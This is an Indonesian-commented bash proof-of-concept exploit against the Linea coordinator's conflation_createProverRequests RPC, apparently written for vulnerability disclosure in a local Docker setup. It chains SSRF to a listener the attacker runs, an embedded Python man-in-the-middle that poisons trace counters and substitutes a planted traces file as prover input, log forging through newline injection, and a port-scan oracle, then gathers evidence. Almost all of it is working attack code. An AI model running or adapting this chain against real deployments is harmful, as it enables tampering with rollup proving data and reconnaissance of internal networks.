#!/bin/bash
# ==============================================================================
# LINEA COORDINATOR SSRF - FINAL PoC v16 (fully dynamic)
# FIX v16:
#   F1: poison_counters menargetkan result.tracesCounters (format asli API)
#   F2: shomeiApi DIARAHKAN LANGSUNG ke container shomei (docker DNS),
#       tidak lewat MITM host (menyebabkan retry + job stuck sebelum request file)
#   F3: log injection dengan newline JSON-escaped (parser build baru strict)
#       + shomeiApi ditambahkan (DTO wajib)
#   F4: port oracle payload + shomeiApi (DTO wajib)
#   F5: evidence poisoned-batch grep spesifik (ADD=1000/999999999)
# ==============================================================================
set -u
OUT="poc_ssrf_final_results.txt"
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1

echo "=================================================================="
echo "  LINEA COORDINATOR SSRF - FINAL PoC v16 (fully dynamic)"
echo "  Phase: Discover -> SSRF -> Poison -> Prover Input -> Log Forge"
echo "=================================================================="
echo "Timestamp: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo ""

# ==============================================================================
# PHASE 0: DISCOVERY
# ==============================================================================
echo "=============== PHASE 0: ENVIRONMENT DISCOVERY ==============="

find_coordinator() {
  local c
  c=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -iE "^coordinator$|linea-coordinator|coordinator" | head -n1)
  [ -n "$c" ] && echo "$c" && return 0
  c=$(docker ps --format '{{.Names}}\t{{.Image}}' 2>/dev/null | grep -iE "coordinator" | awk -F'\t' '{print $1}' | head -n1)
  [ -n "$c" ] && echo "$c" && return 0
  return 1
}
COORD=$(find_coordinator)
if [ -z "$COORD" ]; then
  echo "[-] Container Coordinator tidak ditemukan. Container berjalan:"
  docker ps --format '{{.Names}}\t{{.Image}}' 2>/dev/null | head -20 | sed 's/^/    /'
  exit 1
fi
echo "[+] Coordinator container : $COORD"

find_rpc_port() {
  local c="$1" p=""
  p=$(docker logs "$c" 2>&1 | grep -oiE "JSON-RPC server started port=[0-9]+" | tail -n1 | grep -oE "[0-9]+$")
  [ -n "$p" ] && echo "$p" && return 0
  p=$(docker exec "$c" sh -c 'cat /opt/consensys/linea/coordinator/config/*.toml 2>/dev/null | grep -oE "json-rpc-port\s*=\s*[0-9]+" | grep -oE "[0-9]+"' 2>/dev/null)
  [ -n "$p" ] && echo "$p" && return 0
  p=$(docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$c" 2>/dev/null | grep -oE "JSON_RPC_PORT=[0-9]+" | grep -oE "[0-9]+")
  [ -n "$p" ] && echo "$p" && return 0
  echo "9546"
}
RPC_PORT=$(find_rpc_port "$COORD")

CONTAINER_IPS=($(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$COORD" 2>/dev/null))
CONTAINER_GWS=($(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.Gateway}} {{end}}' "$COORD" 2>/dev/null))

RPC=""
for ip in "${CONTAINER_IPS[@]}"; do
  for port in "$RPC_PORT" 9546 9545 8545; do
    r=$(curl -s --connect-timeout 3 --max-time 5 -X POST "http://${ip}:${port}/" \
        -H 'Content-Type: application/json' \
        -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}' 2>/dev/null)
    if echo "$r" | grep -q '"jsonrpc"'; then
      RPC="http://${ip}:${port}/"; break 2
    fi
  done
done
if [ -z "$RPC" ]; then
  echo "[-] Coordinator RPC tidak reachable. Health:"
  docker ps --filter name="$COORD" --format "    Status: {{.Status}}"
  echo "    Jika unhealthy: docker restart $COORD; sleep 60; re-run"
  exit 1
fi
echo "[+] Coordinator RPC       : $RPC (port $RPC_PORT)"
GW="${CONTAINER_GWS[0]:-172.17.0.1}"
echo "[+] Gateway IP (OOB host) : $GW"

find_by_probe() { # $1=method, $2=port, $3=params-json; hanya match '"result"'
  local m="$1" pt="$2" pj="${3:-[]}"
  for c in $(docker ps --format '{{.Names}}' | grep -viE "$COORD"); do
    for cip in $(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" 2>/dev/null); do
      r=$(curl -s --connect-timeout 2 --max-time 3 -X POST "http://${cip}:${pt}" \
          -H 'Content-Type: application/json' \
          -d "{\"jsonrpc\":\"2.0\",\"method\":\"$m\",\"params\":$pj,\"id\":1}" 2>/dev/null)
      if echo "$r" | grep -q '"result"'; then echo "$cip"; return 0; fi
    done
  done
  return 1
}

echo "[*] Mencari Sequencer..."
SEQ_IP=$(find_by_probe "eth_blockNumber" 8545)
echo "[+] Sequencer IP: ${SEQ_IP:-NOT_FOUND}"

echo "[*] Mencari Traces API (probe dengan blockNumber valid)..."
TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8545 '[{"blockNumber":1}]')
[ -z "$TRACES_IP" ] && TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8080 '[{"blockNumber":1}]')
echo "[+] Traces/Besu IP: ${TRACES_IP:-NOT_FOUND}"

# F2: shomei endpoint untuk JOB = NAMA CONTAINER (coordinator resolve via docker DNS)
find_shomei_name() {
  local n
  for pat in "shomei-frontend" "^shomei$" "shomei"; do
    n=$(docker ps --format '{{.Names}}' | grep -iE "$pat" | head -n1)
    [ -n "$n" ] && echo "$n" && return 0
  done
  return 1
}
SHOMEI_NAME=$(find_shomei_name)
if [ -n "$SHOMEI_NAME" ]; then
  SHOMEI_EP="http://${SHOMEI_NAME}:8888"
else
  SHIP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8888 '[{"startBlockNumber":1,"endBlockNumber":1}]')
  [ -z "$SHIP" ] && SHIP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8546 '[{"startBlockNumber":1,"endBlockNumber":1}]')
  SHOMEI_EP="http://${SHIP}:8888"
fi
echo "[+] Shomei endpoint (untuk job, direct-by-name): ${SHOMEI_EP:-NOT_FOUND}"

find_host_data() {
  local c="$1" src=""
  src=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$c" 2>/dev/null)
  [ -n "$src" ] && { echo "$src"; return 0; }
  for d in /workspaces/lineth-monorepo /workspace/lineth-monorepo ~/lineth-monorepo ../lineth-monorepo ./; do
    if [ -f "$d/docker/compose-tracing-v2.yml" ] || [ -d "$d/tmp/local" ]; then
      echo "$d/tmp/local"; return 0
    fi
  done
  src=$(docker inspect -f '{{range .Mounts}}{{if contains .Destination "conflation-backtesting"}}{{.Source}}{{end}}{{end}}' "$c" 2>/dev/null)
  [ -n "$src" ] && { echo "$(dirname "$src")"; return 0; }
  return 1
}
HOST_DATA=$(find_host_data "$COORD")
echo "[+] Host data dir: ${HOST_DATA:-NOT_FOUND (file evidence di-skip)}"
[ -n "$HOST_DATA" ] && mkdir -p "$HOST_DATA/conflation-backtesting" 2>/dev/null

echo -e "\n[*] Chain head (sequencer):"
CHAIN_HEAD=0
if [ -n "$SEQ_IP" ]; then
  HX=$(curl -s -m 5 -X POST "http://${SEQ_IP}:8545" -H 'Content-Type: application/json' \
       -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
  [ -n "$HX" ] && CHAIN_HEAD=$((HX))
fi
echo "    Chain head: $CHAIN_HEAD"

if [ "$CHAIN_HEAD" -lt 5 ]; then
  echo "    Chain kosong/idle - menunggu block production (max 120s)..."
  for i in $(seq 1 12); do
    sleep 10
    if [ -n "$SEQ_IP" ]; then
      HX=$(curl -s -m 5 -X POST "http://${SEQ_IP}:8545" -H 'Content-Type: application/json' \
           -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
      [ -n "$HX" ] && CHAIN_HEAD=$((HX))
    fi
    [ "$CHAIN_HEAD" -ge 5 ] && break
    printf "    ... head=%d (%ds)\r" "$CHAIN_HEAD" $((i*10))
  done
  echo ""
fi

if [ "$CHAIN_HEAD" -ge 5 ]; then
  END=$((CHAIN_HEAD-2)); START=$((CHAIN_HEAD-3))
  if [ -n "$TRACES_IP" ]; then
    TC=$(curl -s -m 5 -X POST "http://${TRACES_IP}:8545" -H 'Content-Type: application/json' \
      -d "{\"jsonrpc\":\"2.0\",\"method\":\"linea_getBlockTracesCountersV2\",\"params\":[{\"blockNumber\":$START}],\"id\":1}" 2>/dev/null)
    if ! echo "$TC" | grep -q '"tracesCounters"'; then
      for b in $(seq 1 "$CHAIN_HEAD"); do
        TC=$(curl -s -m 5 -X POST "http://${TRACES_IP}:8545" -H 'Content-Type: application/json' \
          -d "{\"jsonrpc\":\"2.0\",\"method\":\"linea_getBlockTracesCountersV2\",\"params\":[{\"blockNumber\":$b}],\"id\":1}" 2>/dev/null)
        if echo "$TC" | grep -q '"tracesCounters"'; then END=$b; START=$b; break; fi
      done
    fi
  fi
else
  START=1; END=2
fi
echo "[+] Block range untuk job: $START..$END"

echo -e "\n=================================================================="
echo "  DISCOVERY SELESAI - mulai attack chain"
echo "=================================================================="

# ==============================================================================
# PHASE 1: BASELINE SSRF - OOB capture
# ==============================================================================
echo -e "\n=============== PHASE 1: BASELINE SSRF (OOB) ==============="

OOB_PORT=12345
fuser -k ${OOB_PORT}/tcp 2>/dev/null; sleep 1
OOB_LOG=/tmp/ssrf_oob_capture.txt
rm -f "$OOB_LOG"; : > "$OOB_LOG"
python3 - <<'PYEOF' > /dev/null 2>&1 &
import http.server
LOG="/tmp/ssrf_oob_capture.txt"
class H(http.server.BaseHTTPRequestHandler):
    def _log(self, body=b""):
        with open(LOG, "a") as f:
            f.write("%s %s from %s\n  headers=%s\n  body=%r\n" % (
                self.command, self.path, self.client_address[0], dict(self.headers), body[:300]))
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        self._log(body)
        r=b'{"jsonrpc":"2.0","id":1,"result":{}}'
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(r))); self.end_headers(); self.wfile.write(r)
    def do_GET(self):
        self._log()
        r=b'{"ok":1}'
        self.send_response(200); self.send_header("Content-Length",str(len(r)))
        self.end_headers(); self.wfile.write(r)
    def log_message(self, *a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12345),H).serve_forever()
PYEOF
OOB_PID=$!; sleep 1

echo "[1.1] Mengirim payload SSRF (tracesApi = OOB server)..."
R=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
    \"tracesApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":100},
    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
echo "    Response: $R"
echo "[1.2] Menunggu 30 detik..."
sleep 30
if [ -s "$OOB_LOG" ]; then
  echo "    [!!!] SSRF TERKONFIRMASI - request outbound ditangkap:"
  cat "$OOB_LOG" | head -20 | sed 's/^/      /'
else
  echo "    [-] Tidak ada request (lanjut ke phase lain)"
fi

# ==============================================================================
# PHASE 2: DATA POISONING + PROVER INPUT (MITM hanya untuk traces;
#          shomei DIRECT ke container shomei - F2)
# ==============================================================================
echo -e "\n=============== PHASE 2: DATA POISONING ==============="

MITM_PORT=12346
fuser -k ${MITM_PORT}/tcp 2>/dev/null; sleep 1

if [ -n "$TRACES_IP" ]; then export UPSTREAM_TRACES="http://${TRACES_IP}:8545"; else export UPSTREAM_TRACES=""; fi
MITM_LOG=/tmp/ssrf_mitm_log.txt
rm -f "$MITM_LOG"; : > "$MITM_LOG"

MARK="ATTACKER$(date +%s)"
export SSRF_MARK="$MARK"

python3 - <<'PYEOF' > /dev/null 2>&1 &
import http.server, json, os, urllib.request, urllib.error
TRACES=os.environ.get("UPSTREAM_TRACES","")
LOG="/tmp/ssrf_mitm_log.txt"
MARK=os.environ.get("SSRF_MARK","ATTACKER")
FAKE_PATH="/data/traces/v2/conflated/%s.attacker.lt.gz" % MARK
def forward(body):
    if not TRACES:
        return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32601,"message":"no upstream"}}).encode()
    req=urllib.request.Request(TRACES, data=body, headers={"Content-Type":"application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=180) as r: return 200, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"proxy:%s"%e}}).encode()

def find_counters_target(obj):
    """F1: format asli response = result.tracesCounters (flat dict).
    Fallback: countersMap (nested)."""
    res = obj.get("result") if isinstance(obj, dict) else None
    if not isinstance(res, dict): return None
    for key in ("tracesCounters", "countersMap", "counters"):
        if isinstance(res.get(key), dict): return res[key]
    tc = res.get("tracesCounters")
    if isinstance(tc, dict) and isinstance(tc.get("countersMap"), dict): return tc["countersMap"]
    return None

def poison_counters(obj, mode):
    tgt = find_counters_target(obj)
    if tgt is None: return []
    hits=[]
    for k in list(tgt.keys()):
        if isinstance(tgt[k], int):
            hits.append(k)
            tgt[k] = 999999999 if mode=="over" else tgt[k]+1000
    return hits

def poison_filename(obj):
    note=""
    res = obj.get("result") if isinstance(obj, dict) else None
    if isinstance(res, dict) and "conflatedTracesFileName" in res:
        orig = res["conflatedTracesFileName"]
        res["conflatedTracesFileName"]=FAKE_PATH
        res["tracesEngineVersion"]="attacker-1"
        note="TAMPER filename: %s -> %s" % (orig, FAKE_PATH)
    return note

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        try: method=json.loads(body).get("method","")
        except: method=""
        code, resp = forward(body)   # semua request -> traces upstream (shomei kini direct)
        note=""
        if code==200 and method=="linea_getBlockTracesCountersV2":
            if "/poison-over" in self.path:
                try:
                    obj=json.loads(resp); hits=poison_counters(obj,"over")
                    if hits: note="[OVER:%d counters -> 999999999]"%len(hits); resp=json.dumps(obj).encode()
                except: pass
            elif "/poison-plus" in self.path:
                try:
                    obj=json.loads(resp); hits=poison_counters(obj,"plus")
                    if hits: note="[PLUS:%d counters +1000]"%len(hits); resp=json.dumps(obj).encode()
                except: pass
        elif code==200 and method=="linea_generateConflatedTracesToFileV2" and "/poison-file" in self.path:
            try:
                obj=json.loads(resp); note=poison_filename(obj)
                if note: resp=json.dumps(obj).encode()
            except: pass
        with open(LOG,"a") as f:
            f.write(">> %s %s %s\n   resp: %s\n" % (self.path, method, note, resp[:200].decode(errors='replace')))
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(resp))); self.end_headers(); self.wfile.write(resp)
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Length","2")
        self.end_headers(); self.wfile.write(b"{}")
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12346),H).serve_forever()
PYEOF
MITM_PID=$!; sleep 1
echo "[+] MITM aktif (:$MITM_PORT) -> traces=${UPSTREAM_TRACES:-none} | shomei job-direct: ${SHOMEI_EP:-none}"

# Payload builder: traces via MITM(path), shomei DIRECT (F2)
submit_job() { # $1 = path suffix MITM
  curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
    \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
    \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
      \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}$1\",\"requestLimitPerEndpoint\":100},
      \"shomeiApi\":{\"endpoint\":\"${SHOMEI_EP:-http://${GW}:${OOB_PORT}}\",\"requestLimitPerEndpoint\":100}}]}"
}

echo "[2.1] Submit POISON-PLUS job (counters +1000, silent)..."
RP=$(submit_job "/poison-plus"); echo "    Response: $RP"
JOB_PLUS=$(echo "$RP" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)

echo "[2.2] Submit POISON-OVER job (counters=999999999, decision control)..."
RO=$(submit_job "/poison-over"); echo "    Response: $RO"
JOB_OVER=$(echo "$RO" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)

echo "[2.3] Submit PROVER-INPUT job (filename tamper)..."
if [ -n "$HOST_DATA" ]; then
  mkdir -p "$HOST_DATA/traces/v2/conflated"
  printf '{"fake":"traces","marker":"%s"}' "$MARK" > "$HOST_DATA/traces/v2/conflated/$MARK.attacker.lt.gz"
  echo "    File ditanam: /data/traces/v2/conflated/$MARK.attacker.lt.gz"
fi
RF=$(submit_job "/poison-file"); echo "    Response: $RF"
JOB_FILE=$(echo "$RF" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
echo "    JobIDs: PLUS=$JOB_PLUS | OVER=$JOB_OVER | FILE=$JOB_FILE"

echo "[2.4] Monitoring maks 300s (exit dini: poisoned batch ATAU request file)..."
for i in $(seq 1 30); do
  sleep 10
  PB=$(docker logs "$COORD" --since 5m 2>&1 | grep "new batch" | grep -cE "ADD=1000|ADD=999999999" || true)
  FJ=""
  if [ -n "$HOST_DATA" ] && [ -n "$JOB_FILE" ]; then
    FJ=$(find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -name "*.json" -type f 2>/dev/null | head -n1)
  fi
  if [ -n "$FJ" ] || [ "${PB:-0}" -ge 1 ]; then echo "    [+] terdeteksi pada detik $((i*10))"; break; fi
  printf "    ... %ds (poisoned-batch=%s, reqfile=%s)\r" $((i*10)) "${PB:-0}" "$([ -n "$FJ" ] && echo ADA || echo '-')"
done
echo ""

# ==============================================================================
# PHASE 3: LOG INJECTION (CWE-117) - F3: escaped newline + shomeiApi
# ==============================================================================
echo -e "\n=============== PHASE 3: LOG INJECTION ==============="

SPOOF_MARK="SPOOF$(date +%s)"
# JSON-escaped newline: \\n di shell -> \n di JSON -> newline nyata setelah parse
FORGED_URL="http://${GW}:${OOB_PORT}/x\\ntime=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"

echo "[3.1] Submit URL dengan newline escaped (log forging)..."
RL=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"$FORGED_URL\",\"requestLimitPerEndpoint\":1},
  \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":1}}]}")
echo "    Response: $RL"
sleep 15
if docker logs "$COORD" 2>&1 | grep -q "time=2099-01-01.*$SPOOF_MARK"; then
  echo "    [!!!] LOG FORGING CONFIRMED (CWE-117):"
  docker logs "$COORD" 2>&1 | grep "time=2099" | head -2 | sed 's/^/      /'
else
  echo "    [-] Forged line belum terdeteksi. Cek manual:"
  docker logs "$COORD" --since 2m 2>&1 | grep -i "Illegal character" | head -2 | cut -c1-250 | sed 's/^/      /'
fi

# ==============================================================================
# PHASE 4: PORT SCAN ORACLE - F4: + shomeiApi
# ==============================================================================
echo -e "\n=============== PHASE 4: PORT SCAN ORACLE ==============="

echo "[4.1] Closed port (connection refused oracle)..."
RS=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"http://${GW}:9999\",\"requestLimitPerEndpoint\":1},
  \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":1}}]}")
echo "    Response: $RS"
sleep 25
ORACLE=$(docker logs "$COORD" --since 40s 2>&1 | grep -iE "refused.*9999" | head -n1)
if [ -n "$ORACLE" ]; then
  echo "    [+] ORACLE CONFIRMED: $(echo "$ORACLE" | cut -c1-200)"
else
  echo "    [-] Oracle belum muncul (retry loop butuh waktu - cek ulang nanti)"
fi

# ==============================================================================
# PHASE 5: EVIDENCE COLLECTION
# ==============================================================================
echo -e "\n=============== PHASE 5: EVIDENCE COLLECTION ==============="

echo "(A) MITM LOG (request + tamper + response):"
grep -E "^(>>|   resp)" "$MITM_LOG" 2>/dev/null | head -40 | sed 's/^/    /'

echo -e "\n(B) POISONED BATCHES (grep spesifik - F5):"
docker logs "$COORD" 2>&1 | grep "new batch" | grep -E "ADD=1000|ADD=999999999" | tail -4 | cut -c1-300 | sed 's/^/    /'

echo -e "\n(C) File request job PROVER-INPUT:"
if [ -n "$HOST_DATA" ] && [ -n "$JOB_FILE" ]; then
  JDIR="$HOST_DATA/conflation-backtesting/$JOB_FILE"
  find "$JDIR" -type f 2>/dev/null | head -10 | sed 's/^/    /'
  for f in $(find "$JDIR" -name "*.json" -type f 2>/dev/null | head -3); do
    echo "    --- $(basename "$f")"
    grep -oE '"conflatedExecutionTracesFile"[^,}]*|"tracesEngineVersion"[^,}]*' "$f" | head -4 | sed 's/^/      /'
  done
  if find "$JDIR" -name "*.json" -exec grep -l "$MARK" {} \; 2>/dev/null | grep -q .; then
    echo "    [!!!] MARKER $MARK di request file - PROVER INPUT CONTROL TERBUKTI"
  fi
  if find "$JDIR" -name "*attacker-1*" 2>/dev/null | grep -q .; then
    echo "    [!!!] tracesEngineVersion attacker tertanam di NAMA file request (etvattacker-1)"
  fi
  echo "    (pembanding) Log job FILE (di mana job berhenti):"
  docker logs "$COORD" 2>&1 | grep "job_${JOB_FILE}" | grep -v coordinatorConfig= | tail -8 | cut -c1-250 | sed 's/^/      /'
else
  echo "    (skip - HOST_DATA / JOB_FILE tidak tersedia)"
fi

echo -e "\n(D) Traces files di shared FS (termasuk file attacker):"
ls -la "$HOST_DATA/traces/v2/conflated/" 2>/dev/null | tail -6 | sed 's/^/    /'

echo -e "\n(E) Retry/log flooding:"
RETRY_COUNT=$(docker logs "$COORD" 2>&1 | grep -c "already retried" || true)
echo "    Total 'already retried' lines: ${RETRY_COUNT:-0}"

echo -e "\n(F) Topology disclosure (config dump):"
docker logs "$COORD" 2>&1 | grep -c "Conflation backtesting coordinatorConfig=" | sed 's/^/    baris config dump: /'
docker logs "$COORD" 2>&1 | grep -oE "endpoints=\[[^]]+\]" | sort -u | head -8 | sed 's/^/    /'

# ==============================================================================
# CLEANUP
# ==============================================================================
echo -e "\n=============== CLEANUP ==============="
kill $OOB_PID $MITM_PID 2>/dev/null
fuser -k 12345/tcp 12346/tcp 2>/dev/null
echo "[+] Listener dibunuh. Bersihkan job zombie:"
echo "    docker restart $COORD"
[ -n "$HOST_DATA" ] && echo "    rm -rf $HOST_DATA/conflation-backtesting/*"

echo ""
echo "Evidence: $OUT | /tmp/ssrf_mitm_log.txt | /tmp/ssrf_oob_capture.txt"
echo "Selesai."
FINALEOF

chmod +x poc_ssrf_final.sh
./poc_ssrf_final.sh
